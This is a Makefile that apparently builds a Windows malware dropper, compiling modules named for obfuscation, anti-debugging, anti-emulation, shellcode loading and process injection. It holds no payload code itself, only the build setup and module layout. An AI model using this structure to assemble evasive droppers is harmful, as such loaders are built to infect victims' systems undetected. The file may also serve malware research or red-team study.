CC=gcc
CFLAGS=-Wall -O2
OUTPUT=../outputs/dropper.exe

SRCS=main.c modules/obfuscation.c modules/anti_debug.c modules/anti_emulation.c modules/shellcode_loader.c modules/injection.c
OBJS=$(SRCS:.c=.o)

all: dropper

dropper: $(OBJS)
	$(CC) $(CFLAGS) -o $(OUTPUT) $(SRCS)

clean:
	rm -f $(OBJS) $(OUTPUT)

